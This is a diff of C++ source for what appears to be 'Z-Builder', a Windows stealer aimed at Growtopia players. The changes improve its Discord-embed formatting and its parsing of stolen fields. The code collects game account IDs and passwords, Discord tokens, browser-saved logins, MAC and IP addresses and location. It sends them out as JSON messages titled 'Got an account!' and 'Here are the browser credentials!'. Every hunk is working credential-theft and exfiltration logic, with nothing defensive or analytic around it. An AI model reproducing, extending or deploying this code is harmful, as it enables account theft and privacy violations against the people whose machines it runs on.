@@ -161,12 +161,12 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         if (IPInfo == "")
         {
             IPInfo = "N/A";
-        }       
+        }
         string AllMAC = GetMAC();
         replace(MAC.begin(), MAC.end(), ':', '-');
         if (!(AllMAC.find(MAC) != string::npos))
         {
-            AllMAC += " | " + MAC + "";
+            AllMAC += " | [" + MAC + "]";
         }
         else
         {
@@ -174,8 +174,8 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
             size_t MainMACLocation = AllMAC.find(MAC);
             AllMAC.replace(MainMACLocation, MAC.length(), MainMAC);
         }
-        string Info = "MAC address(es): ```" + AllMAC + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
-        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Got an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
+        string Info = "**MAC address(es): **`" + AllMAC + "`\\n" + "**IP address: **`" + IPInfo + "`\\n" + "**City / Region / Country: **`" + Location + "`\\n" + "**Time stolen: **`" + Time + "`\\n" + "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`\\n" + "**Discord token: **`" + DToken + "`\\n";
+        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Got an account! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
         CleanUp();
         if (Feature.find(XorStr("[BrowserCreds:(Y)]")) != string::npos)
@@ -343,14 +343,14 @@ void GetBrowserCreds()
             BrowserCred.erase(0, Splitter2 + 1);
             Splitter2 = BrowserCred.find(BrowserSplitter);
             string Password = BrowserCred.substr(0, Splitter2 + 1);
-            string BrowserLineResult = "```" + URL + " | " + UserName + " | " + Password.substr(0, Password.length() - 1) + "```";
+            string BrowserLineResult = "`" + URL + " | " + UserName + " | " + Password.substr(0, Password.length() - 1) + "`\\n";
             if (!(data.size() + BrowserLineResult.size() >= 1800))
             {
                 data += BrowserLineResult;
             }
             else
             {
-                string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the browser credentials! ~Z-Builder\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
+                string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are the browser credentials! ~Z-Builder**__\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
                 SendMessage(Format, "application/json");
                 data = "";
             }
@@ -359,7 +359,7 @@ void GetBrowserCreds()
     ReadResults.close();
     if (data != "")
     {
-        string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the browser credentials! ~Z-Builder\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
+        string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are the browser credentials! ~Z-Builder**__\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
         SendMessage(Format, "application/json");
     }
     remove(WBPVLocation.c_str());
@@ -662,13 +662,16 @@ void RecoverSaveDats()
         LocateAccInfo = SplitData.find(AccDataSplit);
         string Password = SplitData.substr(0, LocateAccInfo);
         SplitData.erase(0, LocateAccInfo + 17);
-        Splitter = SplitData.find(XorStr("[Z-Builder]"));
-        string LastWorld = SplitData.substr(0, Splitter);
-        Info += "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
+        LocateAccInfo = SplitData.find(AccDataSplit);
+        string LastWorld = SplitData.substr(0, LocateAccInfo);
+        SplitData.erase(0, LocateAccInfo + 17);
+        Splitter = FullData.find(XorStr("[Z-Builder]"));
+        SplitData.erase(0, Splitter + 11);
+        Info += "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`\\n\\n";
     }
     if (Info != "")
     {
-        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the recovered account(s)! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
+        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are the recovered account(s)! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json");
     }
 }
@@ -769,13 +772,14 @@ void LocateAllAccs()
         MiniSplitter = aData.find("[---Z-Builder---]");
         string Password = aData.substr(0, MiniSplitter);
         aData.erase(0, MiniSplitter + MiniSplit.size());
-        string LastWorld = aData;
+        MiniSplitter = aData.find("[---Z-Builder---]");
+        string LastWorld = aData.substr(0, MiniSplitter);;
         AllData.erase(0, Splitter + Splits.size());
-        Info += "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
+        Info += "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`\\n\\n";
     }
     if (Info.find("GrowID") != string::npos)
     {
-        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are all account(s) on the PC (besides recycle bin)! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
+        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are all account(s) on the PC (besides recycle bin)! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
     }
 }
@@ -886,7 +890,8 @@ void TraceAcc()
                         StringSplit = AccDataContent.find(AccDataSplit);
                         Password = AccDataContent.substr(0, StringSplit);
                         AccDataContent.erase(0, StringSplit + AccDataSplit.size());
-                        LastWorld = AccDataContent;
+                        StringSplit = AccDataContent.find(AccDataSplit);
+                        LastWorld = AccDataContent.substr(0, StringSplit);;
                     }
                     else
                     {
@@ -894,9 +899,9 @@ void TraceAcc()
                         Password = "No password found";
                         LastWorld = "No world found";
                     }
-                    string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
+                    string Info = "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`";
                     CleanUp();
-                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
+                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Traced an account! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                     SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                 }
             }
@@ -940,7 +945,8 @@ void TraceAcc()
                         StringSplit = AccDataContent.find(AccDataSplit);
                         Password = AccDataContent.substr(0, StringSplit);
                         AccDataContent.erase(0, StringSplit + AccDataSplit.size());
-                        LastWorld = AccDataContent;
+                        StringSplit = AccDataContent.find(AccDataSplit);
+                        LastWorld = AccDataContent.substr(0, StringSplit);
                     }
                     else
                     {
@@ -948,9 +954,9 @@ void TraceAcc()
                         Password = "No password found";
                         LastWorld = "No world found";
                     }
-                    string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
+                    string Info = "GrowID: `" + GrowID + "`\\n" + "Password: `" + Password + "`\\n" + "Last world: `" + LastWorld + "`";
                     CleanUp();
-                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
+                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Traced an account! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                     SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                 }
             }
